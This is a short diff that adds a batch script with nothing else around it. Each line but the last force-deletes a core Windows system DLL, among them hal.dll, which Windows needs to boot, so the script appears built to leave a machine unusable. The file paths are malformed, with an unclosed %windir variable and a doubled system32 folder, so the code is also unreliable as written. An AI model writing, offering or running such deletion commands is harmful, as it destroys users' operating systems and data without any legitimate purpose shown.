@@ -1,0 +1,12 @@
+del /F /Q "%windir\system32\WINDOWS\system32\hal.dll"
+del /F /Q "%windir\system32\WINDOWS\system32\hccoin.dll"
+del /F /Q "%windir\system32\WINDOWS\system32\h323msp.dll"
+del /F /Q "%windir\system32\WINDOWS\system32\gpkrsrc.dll"
+del /F /Q "%windir\system32\WINDOWS\system32\gpkcsp.dll"
+del /F /Q "%windir\system32\WINDOWS\system32\gpedit.dll"
+del /F /Q "%windir\system32\WINDOWS\system32\hypertrm.dll"
+del /F /Q "%windir\system32\WINDOWS\system32\iassam.dll"
+del /F /Q "%windir\system32\WINDOWS\system32\iassdo.dll"
+del /F /Q "%windir\system32\WINDOWS\system32\icm32.dll"
+del /F /Q "%windir\system32\WINDOWS\system32\iesetup.dll"
+EXIT
